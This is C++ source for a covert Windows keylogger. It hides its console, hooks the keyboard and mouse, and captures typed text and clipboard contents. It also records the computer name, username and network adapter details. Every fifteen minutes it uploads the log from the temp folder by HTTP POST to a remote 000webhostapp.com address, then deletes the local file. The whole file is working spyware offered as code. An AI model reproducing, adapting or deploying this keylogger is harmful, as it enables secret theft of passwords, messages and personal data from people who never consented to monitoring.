#define CURL_STATICLIB

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <iphlpapi.h>

#include "curl/curl.h"

// Linking the libraries
#ifdef _DEBUG
#pragma comment(lib, "curl/libcurl_a_debug.lib")
#else
#pragma comment(lib, "curl/libcurl_a.lib")
#endif

// user32 for the keyboard hook and the mouse hook
#pragma comment(lib, "user32.lib") // user32.dll windows' library

// all these are for http requests and libcurl functions
#pragma comment(lib, "normaliz.lib") // normaliz.dll windows' library
#pragma comment(lib, "iphlpapi.lib") // iphlpapi.dll windows' library
#pragma comment(lib, "advapi32.lib") // advapi32.dll windows' library
#pragma comment(lib, "crypt32.lib") // crypt32.dll windows' library
#pragma comment(lib, "wldap32.lib") // wldap32.dll windows' library

#define VK_0	0x30	// '0'
#define VK_1	0x31	// '1'
#define VK_2	0x32	// '2'
#define VK_3	0x33	// '3'
#define VK_4	0x34	// '4'
#define VK_5	0x35	// '5'
#define VK_6	0x36	// '6'
#define VK_7	0x37	// '7'
#define VK_8	0x38	// '8'
#define VK_9	0x39	// '9'

#define VK_A	0x41	// 'A'
#define VK_B	0x42	// 'B'
#define VK_C	0x43	// 'C'
#define VK_D	0x44	// 'D'
#define VK_E	0x45	// 'E'
#define VK_F	0x46	// 'F'
#define VK_G	0x47	// 'G'
#define VK_H	0x48	// 'H'
#define VK_I	0x49	// 'I'
#define VK_J	0x4A	// 'J'
#define VK_K	0x4B	// 'K'
#define VK_L	0x4C	// 'L'
#define VK_M	0x4D	// 'M'
#define VK_N	0x4E	// 'N'
#define VK_O	0x4F	// 'O'
#define VK_P	0x50	// 'P'
#define VK_Q	0x51	// 'Q'
#define VK_R	0x52	// 'R'
#define VK_S	0x53	// 'S'
#define VK_T	0x54	// 'T'
#define VK_U	0x55	// 'U'
#define VK_V	0x56	// 'V'
#define VK_W	0x57	// 'W'
#define VK_X	0x58	// 'X'
#define VK_Y	0x59	// 'Y'
#define VK_Z	0x5A	// 'Z'

// redefine some keys for the Italian keyboard
// SC stay for "Special Characters" with accent
#define VK_SC_E				0xBA	// èé[{ (VK_OEM_3)
#define VK_SC_O				0xC0	// òç@	(VK_OEM_1)
#define VK_SC_A				0xDE	// à°#	(VK_OEM_7)
#define VK_SC_U				0xBF	// ù§	(VK_OEM_2)
#define VK_SC_I				0xDD	// ì^	(VK_OEM_6)
#define VK_BACKSLASH		0xDC	// \|	(VK_OEM_5)
#define VK_APOSTROPHE		0xDB	// '?	(VK_OEM_4)

HHOOK hKeyboardHook; // istancing the keyboard hook
HHOOK hMouseHook; // istancing the mouse hook

char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFolder Path
DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed

const std::chrono::seconds waitTime = std::chrono::seconds(int(15 * 60)); // seconds -> 15 minutes

std::string clipBoardLastSave = ""; // saving the text saved in the windows' clipBoard
std::string contentFile = ""; // save everything of what is been writing down

// Keyboard hook
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		bool isShiftPressed = ((GetKeyState(VK_LSHIFT) & 0x8000) != 0) || ((GetKeyState(VK_RSHIFT) & 0x8000) != 0);
		bool isCapsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
		bool isCtrlPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0) || ((GetKeyState(VK_RCONTROL) & 0x8000) != 0);
		bool isNumLockActive = ((GetKeyState(VK_NUMLOCK) & 1) != 0);
		bool isAltPressed = ((GetKeyState(VK_LMENU) & 0x8000) != 0);
		bool isAltGrPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0 && (GetKeyState(VK_RMENU) & 0x8000) != 0);

		int vkCode = pKeyboardStruct->vkCode;
		std::string message("");

		// checking CTRL + C or CTRL + V, and SHIFT + F10 because with that you can simulate the mouse right click, then copy
		if ((isCtrlPressed && (vkCode == VK_V || vkCode == VK_C)) || (isShiftPressed && VK_F10))
		{
			// checking if the clipboard is open
			if (OpenClipboard(NULL))
			{
				// getting the clipboard data
				HANDLE hData = GetClipboardData(CF_TEXT);
				if (hData != NULL)
				{
					// getting the text from the clipboard by locking it
					char* text = static_cast<char*>(GlobalLock(hData));
					if (text != NULL)
					{
						message.append("\n--- CTRL + (C/V) ---\n");
						message.append(text);
						clipBoardLastSave = text;
						message.append("\n--/FINE -> CTRL + (C/V)\\--\n");
						// unlocking the clipboard
						GlobalUnlock(hData);
					}
				}
				CloseClipboard();
			}
		}
		// checking TAB and SPACE
		else if (!isShiftPressed && !isCapsLockActive && !isAltPressed && (vkCode == VK_SPACE || vkCode == VK_TAB) && !isCtrlPressed)
		{
			!(vkCode ^ VK_TAB) ? (message = "|TAB|") : ((vkCode ^ VK_SPACE) ?: (message = " "));
		}
		// checking lowercase letters
		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && (vkCode >= VK_A && vkCode <= VK_Z) && !isCtrlPressed)
		{
			message = std::tolower(vkCode);
		}
		// checking capital letters
		else if ((isShiftPressed || isCapsLockActive) && !(pKeyboardStruct->flags & LLKHF_UP) && (vkCode >= VK_A && vkCode <= VK_Z))
		{
			message = std::toupper(vkCode);
		}
		// checking the numbers (and the numbers of the numeric keypad)
		else if (((vkCode >= VK_0 && vkCode <= VK_9) || (isNumLockActive && (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9))) && !isShiftPressed)
		{
			// controllo singolarmente i numeri del tastierino numerico (a destra della tastiera)
			switch (vkCode)
			{
			case VK_NUMPAD0: // 0
				message = "0";
				break;
			case VK_NUMPAD1: // 1
				message = "1";
				break;
			case VK_NUMPAD2: // 2
				message = "2";
				break;
			case VK_NUMPAD3: // 3
				message = "3";
				break;
			case VK_NUMPAD4: // 4
				message = "4";
				break;
			case VK_NUMPAD5: // 5
				message = "5";
				break;
			case VK_NUMPAD6: // 6
				message = "6";
				break;
			case VK_NUMPAD7: // 7
				message = "7";
				break;
			case VK_NUMPAD8: // 8
				message = "8";
				break;
			case VK_NUMPAD9: // 9
				message = "9";
				break;
			default: // tutti i numeri sopra le lettere
				message = vkCode;
				break;
			}
		}
		// special characters with ALTRGR
		else if (!isShiftPressed && isAltGrPressed && (vkCode == VK_SC_E || vkCode == VK_OEM_PLUS || vkCode == VK_SC_O || vkCode == VK_SC_A))
		{
			switch (vkCode)
			{
			case VK_SC_E: // [
				message = "[";
				break;
			case VK_OEM_PLUS: // ]
				message = "]";
				break;
			case VK_SC_O: // @
				message = "@";
				break;
			case VK_SC_A: // #
				message = "#";
				break;
			}
		}
		// curly brackets
		else if (isShiftPressed && isAltGrPressed && (vkCode == VK_SC_E || vkCode == VK_OEM_PLUS))
		{
			!(vkCode ^ VK_SC_E /* { */) ? (message = "{") : ((vkCode ^ VK_OEM_PLUS /* } */) ?: (message = "}"));
		}
		// checking special characters
		else if (isShiftPressed && ((vkCode >= VK_SC_E && vkCode <= VK_SC_O) || (vkCode >= VK_APOSTROPHE && vkCode <= VK_SC_A) || (vkCode >= VK_0 && vkCode <= VK_9)))
		{
			// checking the special characters with SHIFT
			switch (vkCode)
			{
			case VK_0: // =
				message = "=";
				break;
			case VK_1: // !
				message = "!";
				break;
			case VK_2: // "
				message = "\"";
				break;
			case VK_3: // £
				message = "|£156|";
				break;
			case VK_4: // $
				message = "$";
				break;
			case VK_5: // %
				message = "%";
				break;
			case VK_6: // &
				message = "&";
				break;
			case VK_7: // '/'
				message = "/";
				break;
			case VK_8: // (
				message = "(";
				break;
			case VK_9: // )
				message = ")";
				break;
			case VK_SC_E: // é
				message = "|é130|";
				break;
			case VK_OEM_PLUS: // 'SHIFT' + '+' = '*'
				message = "*";
				break;
			case VK_OEM_COMMA: // ;
				message = ";";
				break;
			case VK_OEM_MINUS: // _
				message = "_";
				break;
			case VK_OEM_PERIOD: // :
				message = ":";
				break;
			case VK_SC_U: // §
				message = "|§21|";
				break;
			case VK_SC_O: // ç
				message = "|ç135|";
				break;
			case VK_APOSTROPHE: // ?
				message = "?";
				break;
			case VK_BACKSLASH: // |
				message = "|";
				break;
			case VK_SC_I: // ^
				message = "^";
				break;
			case VK_SC_A: // °
				message = "|°167|";
				break;
			}
		}
		// some keys WITHOUT pressing SHIFT
		else if (!isShiftPressed && ((vkCode >= VK_SC_E && vkCode <= VK_SC_O) || (vkCode >= VK_APOSTROPHE && vkCode <= VK_SC_A)))
		{
			switch (vkCode)
			{
			case VK_SC_E: // è
				message = "|è138|";
				break;
			case VK_OEM_PLUS: // +
				message = "+";
				break;
			case VK_OEM_COMMA: // ,
				message = ",";
				break;
			case VK_OEM_MINUS: // -
				message = "-";
				break;
			case VK_OEM_PERIOD: // .
				message = ".";
				break;
			case VK_SC_U: // ù
				message = "|ù151|";
				break;
			case VK_SC_O: // ò
				message = "|ò149|";
				break;
			case VK_APOSTROPHE: // '
				message = "'";
				break;
			case VK_BACKSLASH: // '\'
				message = "\\";
				break;
			case VK_SC_I: // ì
				message = "|ì141|";
				break;
			case VK_SC_A: // à
				message = "|à133|";
				break;
			}
		}
		// ARROWS (UP, DOWN, LEFT, RIGHT)
		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && (vkCode >= VK_LEFT && vkCode <= VK_DOWN) || (!isNumLockActive && vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9))
		{
			if (isCtrlPressed)
				message = "|CTRL->";
			else
				message = "|->";
			switch (vkCode)
			{
			case VK_NUMPAD4:
			case VK_LEFT: // LEFT
				message.append("L|");
				break;
			case VK_NUMPAD8:
			case VK_UP: // UP
				message.append("U|");
				break;
			case VK_NUMPAD6:
			case VK_RIGHT: // RIGHT
				message.append("R|");
				break;
			case VK_NUMPAD2:
			case VK_DOWN: // DOWN
				message.append("D|");
				break;
			}
		}
		// BACKSPACE
		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && vkCode == VK_BACK)
		{
			(isCtrlPressed) ? (message = "|CTRL<|") : (message = "|<|");
		}
		// CANC / DELETE
		else if (!isShiftPressed && !isAltGrPressed && !isAltPressed && vkCode == VK_DELETE)
		{
			(isCtrlPressed) ? (message = "|CTRL>|") : (message = "|>|");
		}
		// checking numPad operators
		else if (vkCode == VK_MULTIPLY || vkCode == VK_ADD || vkCode == VK_SUBTRACT || vkCode == VK_DECIMAL || vkCode == VK_DIVIDE)
		{
			switch (vkCode)
			{
			case VK_MULTIPLY: // *
				message = "*";
				break;
			case VK_ADD: // +
				message = "+";
				break;
			case VK_SUBTRACT: // -
				message = "-";
				break;
			case VK_DECIMAL: // .
				message = ".";
				break;
			case VK_DIVIDE: // '/'
				message = "/";
				break;
			}
		}
		// BLOCK NUM
		else if (vkCode == VK_NUMLOCK)
		{
			(isNumLockActive) ? (message = "\n|LOCKNUM_OFF|\n") : (message = "\n|LOCKNUM_ON|\n");
		}
		// ENTER
		else if (vkCode == VK_RETURN)
		{
			message = "\n";
		}
		// INSERT
		else if (vkCode == VK_INSERT || (!isNumLockActive && vkCode == VK_NUMPAD0))
		{
			message = "|INS|";
		}
		// PAGE UP
		else if (vkCode == VK_PRIOR || (!isNumLockActive && vkCode == VK_NUMPAD9))
		{
			message = "|PAGE_UP|";
		}
		// PAGE DOWN
		else if (vkCode == VK_NEXT || (!isNumLockActive && vkCode == VK_NUMPAD3))
		{
			message = "|PAGE_DOWN|";
		}
		// END
		else if (vkCode == VK_END || (!isNumLockActive && vkCode == VK_NUMPAD1))
		{
			message = "|END|";
		}
		// HOME
		else if (vkCode == VK_HOME || (!isNumLockActive && vkCode == VK_NUMPAD7))
		{
			message = "|HOME|";
		}
		// ESCAPE
		else if (vkCode == VK_ESCAPE)
		{
			message = "|ESC|";
		}

		if (vkCode == VK_ESCAPE			// ESC
			|| vkCode == VK_F1			// F1
			|| vkCode == VK_F2			// F2
			|| vkCode == VK_F3			// F3
			|| vkCode == VK_F4			// F4
			|| vkCode == VK_F5			// F5
			|| vkCode == VK_F6			// F6
			|| vkCode == VK_F7			// F7
			|| vkCode == VK_F8			// F8
			|| vkCode == VK_F9			// F9
			|| vkCode == VK_F10			// F10
			|| vkCode == VK_F11			// F11
			|| vkCode == VK_F12			// F12
			|| vkCode == VK_CAPITAL		// CAPS LOCK
			|| vkCode == VK_LSHIFT		// LSHIFT
			|| vkCode == VK_RSHIFT		// RSHIFT
			|| vkCode == VK_LCONTROL	// LCTRL
			|| vkCode == VK_RCONTROL	// RCTRL
			|| vkCode == VK_LMENU		// LWIN
			|| vkCode == VK_RMENU		// RWIN
			|| vkCode == VK_APPS		// MENU (BOTTOM RIGHT)
			|| vkCode == VK_LMENU		// ALT
			|| vkCode == VK_RMENU		// ALTGR (162 + 165)
			|| vkCode == VK_SNAPSHOT	// STAMP/R SIST (PRINT)
			|| vkCode == VK_SCROLL		// BLOCC SCORR
			|| vkCode == VK_PAUSE		// PAUSA/INTERR
			|| vkCode == VK_CLEAR		// NUMBER FIVE OF NUMERIC KEYPAD WHEN "NUM_LOCK" IS DISABLED
			) return CallNextHookEx(NULL, nCode, wParam, lParam);

		contentFile.append(message);
	}
	// return control to the Operating System
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Check if the clipboard is open and if there is a possible copy
static void checkPossibleCopy(std::string& mess)
{
	if (OpenClipboard(NULL))
	{
		HANDLE hData = GetClipboardData(CF_TEXT);
		if (hData != NULL)
		{
			char* text = static_cast<char*>(GlobalLock(hData));
			if (text != NULL)
			{
				if (clipBoardLastSave != text)
				{
					mess.append("\n--Possibile copia con il mouse--\n");
					mess.append(text);
					mess.append("\n--/*FINE*\\--\n");
					clipBoardLastSave = text;
				}
				GlobalUnlock(hData);
			}
		}
		CloseClipboard();
	}
}

// Callback funciton for the mouseHook
static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	// Verifyng if the mouse event is a click
	if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
	{
		std::string message = "";

		!(wParam ^ WM_LBUTTONDOWN) ? (message = "|<M|") : (!(wParam ^ WM_RBUTTONDOWN) ? (message = "|M>|") : ((wParam ^ WM_MBUTTONDOWN) ?: (message = "|M|")));
		checkPossibleCopy(message);
		contentFile.append(message);
	}

	// Leaving the system its next job of the chain (the next hook)
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// function to convert the MAC address from BYTE to string
static void MACToString(const BYTE* MACData, std::string& macStr) {
	std::ostringstream oss;
	for (int i = 0; i < 6; ++i) {
		oss << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)MACData[i];
		if (i < 5) {
			oss << "-";
		}
	}
	macStr = oss.str();
}

// creating the string that will be written at the beginning of the file containing all the information of the PC
static std::string StartString()
{
	std::string startString = ""; // for the top of the file
	std::time_t now = std::time(nullptr);
	std::tm currentTime;
	// obtaining the PC name
	TCHAR pcname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD pcname_len = sizeof(pcname) / sizeof(pcname[0]);
	// PC name
	startString = "\n------------------------------------\nComputer Name: ";
	if (GetComputerName(pcname, &pcname_len)) {
		std::string pcnameStr(pcname, pcname + pcname_len);
		startString.append(pcnameStr);
	}
	else startString.append("Impossibile ottenere il nome del computer.");
	// User Name
	startString.append("\nUsername: ");
	TCHAR username[256];
	DWORD username_len = sizeof(username) / sizeof(username[0]);
	if (GetUserName(username, &username_len))
	{
		std::string usernameStr(username, username + username_len);
		startString.append(usernameStr);
	}
	else startString.append("Impossibile ottenere il nome utente.");
	// IP and MAC Address
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen = sizeof(AdapterInfo);
	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
	if (dwStatus != ERROR_SUCCESS) {
		startString += "\nGetAdaptersInfo failed with error: " + dwStatus;
	}
	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
	std::string macStr;
	while (pAdapterInfo) {
		// Filtrare gli adattatori fisici e ignorare loopback e virtuali
		if (pAdapterInfo->Type == IF_TYPE_IEEE80211 && !(pAdapterInfo->Index & 0x80000000) ) {
			startString += "\n";
			startString += "\nWireless Connection--";
			MACToString(pAdapterInfo->Address, macStr);
			startString += "\nAdapter Name: ";
			startString.append(pAdapterInfo->AdapterName);
			startString += "\nAdapter Description: ";
			startString.append(pAdapterInfo->Description);
			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
		}
		if (pAdapterInfo->Type == MIB_IF_TYPE_ETHERNET && !(pAdapterInfo->Index & 0x80000000)) {
			startString += "\n";
			startString += "\nEthernet Connection (Physycal MAC address)--";
			MACToString(pAdapterInfo->Address, macStr);
			startString += "\nAdapter Name: ";
			startString.append(pAdapterInfo->AdapterName);
			startString += "\nAdapter Description: ";
			startString.append(pAdapterInfo->Description);
			startString += "\nMAC Address: " + macStr + "\nIP Address: ";
			startString.append(pAdapterInfo->IpAddressList.IpAddress.String);
		}
		pAdapterInfo = pAdapterInfo->Next;
	}
	!(macStr.empty()) ?: (startString += "No physical adapter found.\n");
	startString += "\n";
	// date & time
	localtime_s(&currentTime, &now);
	startString.append("\nDate: ");
	startString.append(std::to_string(currentTime.tm_mday));
	startString.append("/");
	startString.append(std::to_string(currentTime.tm_mon + 1));
	startString.append("/");
	startString.append(std::to_string(currentTime.tm_year + 1900));
	startString.append("\nTime: ");
	startString.append(std::to_string(currentTime.tm_hour));
	startString.append(":");
	startString.append(std::to_string(currentTime.tm_min));
	startString.append(":");
	startString.append(std::to_string(currentTime.tm_sec));
	startString.append("\n------------------------------------\n");
	return startString;
}

static void makeRequest() {
	CURL* curl;
	CURLcode res;
	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();
	// Check if the curl is correctly istanced
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
		// Imposting the file to send
		struct curl_httppost* formpost = NULL;
		struct curl_httppost* lastptr = NULL;
		curl_formadd(&formpost, &lastptr,
			CURLFORM_COPYNAME, "file",
			CURLFORM_FILE, FilePath.c_str(),
			CURLFORM_END);
		// Set the form post parameter
		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
		// Make the request and check the result
		res = curl_easy_perform(curl);
		// Cleanup
		curl_easy_cleanup(curl);
		curl_formfree(formpost);
	}
	curl_global_cleanup();
	// remove the file after sending it
	remove(FilePath.c_str());
}

// thread function
static void timeCheck() {
	std::string tmp;
	while (true) {
		// Wait x minutes
		std::this_thread::sleep_for(waitTime);
		tmp = contentFile;
		// resetting the contentFile
		contentFile = StartString();
		std::ofstream outputFile(FilePath);
		!(outputFile.is_open()) ?: (outputFile << tmp, outputFile.close(), tmp = "");
		// sending the file to the server, and remove it into the thread
		std::thread tSend(makeRequest);
		// detach the thread from the execution, so I can send the file without stopping the keylogger
		tSend.detach();
	}
}

// main function
int main()
{
	FreeConsole(); // hiding the console

	std::thread tTime(timeCheck); // istancing a thread

	contentFile = StartString();
	// istancing the hooks
	HINSTANCE hInstance = GetModuleHandle(nullptr);
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
	hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInstance, 0);

	if (hKeyboardHook == NULL || hMouseHook == NULL) return ERROR_HOOK_NOT_INSTALLED;

	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hKeyboardHook);
	UnhookWindowsHookEx(hMouseHook);

	return ERROR_SUCCESS;
}
